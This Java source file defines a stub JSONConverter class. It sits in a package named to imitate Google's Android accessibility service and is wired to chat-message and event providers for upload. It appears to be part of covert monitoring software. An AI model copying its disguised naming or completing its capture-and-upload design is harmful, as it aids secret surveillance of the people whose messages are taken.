package service.android.google.com.accessibility.util.converter.converters.json;

import android.content.Context;

import java.io.File;

import service.android.google.com.accessibility.upload.UploadType;
import service.android.google.com.accessibility.util.converter.converters.AbstractConverter;
import service.android.google.com.accessibility.util.database.chatmessage.ChatMessageProvider;
import service.android.google.com.accessibility.util.database.event.EventProvider;

/**
 * Created by tim on 17.04.16.
 */
public class JSONConverter extends AbstractConverter {

    public JSONConverter(final Context context,
                         final EventProvider eventProvider,
                         final ChatMessageProvider chatMessageProvider) {
        super(context, UploadType.JSON, eventProvider, chatMessageProvider);
    }

    @Override
    public File getFileName() {
        return null;
    }
}